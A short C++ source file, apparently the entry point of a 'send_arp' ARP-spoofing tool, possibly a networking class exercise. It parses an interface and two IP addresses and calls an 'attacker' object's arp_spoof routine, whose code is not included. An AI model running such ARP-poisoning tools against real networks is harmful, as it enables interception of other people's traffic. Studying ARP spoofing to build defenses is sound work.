#include <iostream>
#include <arpa/inet.h>
#include "filter.h"
#include "utils.h"
#include "agent.h"
#include "ether.h"
#include "arp.h"

void usage(){
    std::cout << "Usage: ./send_arp <interface> <sender ip> <target ip>" << std::endl;
    std::cout << "Example: ./send_arp wlan0 176.12.93.12 172.30.19.18" << std::endl;
}

int main(int argc, char *argv[]){
    if(argc<4){
        usage();
        return -1;
    }

    char *interface = argv[1];
    char *sender_str = argv[2];
    char *target_str = argv[3];
    pktbyte sender[4];
    pktbyte sender_mac[ETH_ALEN];
    pktbyte target[4];
    pktbyte target_mac[ETH_ALEN];
    Agent attacker = Agent(interface);
    Xpkt xpkt = Xpkt();

    if(!inet_pton(AF_INET, sender_str, sender)){
        std::cerr << "[X]Error: sender IP is improper.";
        return -1;
    }

    if(!inet_pton(AF_INET, target_str, target)){
        std::cerr << "[X]Error: target IP is imporoper.";
        return -1;
    }

    std::cout << "Interface: " << interface << std::endl;
    std::cout << "Sender IP: " << sender_str << std::endl;
    std::cout << "Target IP: " << target_str << std::endl;

    if(attacker.arp_spoof(interface, sender, target)){
        std::cout << "Spoofing success" << std::endl;
    }
}